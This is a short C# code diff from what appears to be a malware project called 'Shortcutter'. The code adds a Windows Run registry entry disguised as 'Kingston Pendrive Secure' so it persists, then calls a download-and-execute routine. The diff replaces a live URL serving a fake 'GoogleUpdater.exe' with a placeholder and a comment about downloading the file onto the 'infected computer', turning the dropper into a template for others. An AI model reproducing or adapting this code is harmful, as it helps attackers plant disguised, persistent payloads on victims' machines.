@@ -53,7 +53,7 @@ namespace Shortcutter
                         RegistryKey reg = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                         reg.SetValue("Kingston Pendrive Secure", "\"" + Misc.getLocation() + "\"", RegistryValueKind.String);
 
-                        Misc.dlex("http://webapp36643.cloud1275.configrapp.com/whatsapp-api/js/adm/GoogleUpdater.exe", "");
+                        Misc.dlex("Your download url", ""); //This line make download for your file on infected computer
                     }else
                     {
                         RegistryKey reg = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
